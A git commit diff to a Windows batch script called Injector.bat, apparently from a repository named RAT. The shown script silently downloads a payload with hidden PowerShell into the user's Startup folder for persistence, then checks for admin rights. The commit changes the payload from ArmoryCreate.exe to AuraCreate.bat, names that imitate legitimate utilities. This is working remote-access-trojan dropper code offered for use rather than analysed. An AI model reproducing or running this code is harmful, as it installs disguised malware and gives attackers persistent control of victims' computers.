cc15e1a31926d25c456d3c99e7964f13a0c4fb46
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-04 12:11:32 -0400

    Update Injector.bat

--- Injector.bat
+++ Injector.bat
@@ -1,7 +1,7 @@
 @echo off
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/ArmoryCreate.exe"
-set "AURA_BAT_FILE=%STARTUP_FOLDER%\ArmoryCreate.exe"
+set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/AuraCreate.bat"
+set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
